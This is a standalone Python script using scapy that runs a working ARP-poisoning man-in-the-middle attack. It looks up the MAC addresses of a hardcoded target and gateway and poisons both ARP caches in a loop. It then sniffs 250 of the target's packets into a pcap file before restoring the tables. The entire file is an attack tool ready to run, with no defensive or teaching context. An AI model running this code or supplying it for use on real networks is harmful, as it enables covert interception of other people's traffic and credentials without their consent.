import scapy.all as scapy
import threading
import signal
import sys
import os
import time



targetIP = "192.168.1.100"
gatewayIP = "192.168.1.1"
packets_to_capture = 250
interface = "eth0"

exit_loop_event = threading.Event()

def signal_handler(signum, fram):
    exit_loop_event.set()

def restore_arp_poisoning(target_ip, target_mac, gateway_ip, gateway_mac):

    target = scapy.ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
    gateway = scapy.ARP(op=2, hwsrc=target_mac, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip)

    scapy.send(target, count=5, verbose=False)
    scapy.send(gateway, count=5, verbose=False)

    os.kill(os.getpid(), signal.SIGINT)


def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    # poison target
    poison_target = scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    # poison gateway
    poison_gateway = scapy.ARP(op=2, psrc=target_ip ,pdst=gateway_ip, hwdst=gateway_mac)

    print("[+] Start ARP Cache Poisoning. (CTRL-C to stop)")
    while True:
        try:
            scapy.send(poison_target, verbose=False)
            scapy.send(poison_gateway, verbose=False)
            time.sleep(2)
            
            if exit_loop_event.is_set():
                break
        except Exception as e:
            print(str(e))
            
    print("[-] Restoring APR Cache Poisoning")
    restore_arp_poisoning(target_ip, target_mac, gateway_ip, gateway_mac)
    return


def find_MAC_addr(ip_address):
    try:
        ether_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request = scapy.ARP(pdst=ip_address)
        final_packet = ether_packet/arp_request
        response, unasnwered = scapy.srp(final_packet, timeout=2, verbose=False, retry=10)
        mac_address = response[0][1].hwsrc
        return mac_address
    except Exception as e:
        print(str(e))
        return None


def main():
    global targetMAC, gatewayMAC

    targetMAC = find_MAC_addr(targetIP)
    gatewayMAC = find_MAC_addr(gatewayIP)

    if targetMAC == None or gatewayMAC == None:
        print("[!!!] Failed to get MAC addresses.")
        sys.exit(0)
    else:
        print(f"[+] target({targetIP}) MAC address: {targetMAC}")
        print(f"[+] gateway({gatewayIP}) MAC address: {gatewayMAC}")

    poison_thread = threading.Thread(target=arp_poison, args=(targetIP, targetMAC, gatewayIP, gatewayMAC))
    poison_thread.start()

    try:
        current_dir = os.getcwd()
        print(f"[+] Start sniffing (will capture {packets_to_capture} packets)")
        filter_packets = f"host {targetIP}"
        signal.signal(signal.SIGINT, signal_handler)
        packets = scapy.sniff(iface=interface, count=packets_to_capture, filter=filter_packets)
        scapy.wrpcap(current_dir + "/sniffed.pcap", packets)

        restore_arp_poisoning(targetIP, targetMAC, gatewayIP, gatewayMAC)
    except KeyboardInterrupt:
        restore_arp_poisoning(targetIP, targetMAC, gatewayIP, gatewayMAC)
        sys.exit(0)

main()
# ip = find_MAC_addr("192.168.1.1")
# print(ip)